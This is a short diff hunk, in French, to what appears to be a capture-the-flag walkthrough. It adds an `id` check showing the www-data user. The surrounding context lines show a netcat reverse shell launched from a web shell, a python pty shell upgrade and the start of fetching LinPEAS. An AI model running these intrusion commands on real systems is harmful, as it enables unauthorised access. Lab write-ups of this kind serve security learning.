@@ -105,6 +105,11 @@ J'exécute la commande suivante dans mon web shell : `nc 192.168.7.15 7777 -e /b
 
 Une fois connecté sur mon reverse shell, je passe sur un shell interactif avec la commande suivante : `python -c 'import pty; pty.spawn("/bin/bash")'`
 
+Je regarde avec quel utilisateur je suis connecté `id` :
+```
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
 Ensuite, je récupère le script LinPEAS :
 ```
 cd /tmp
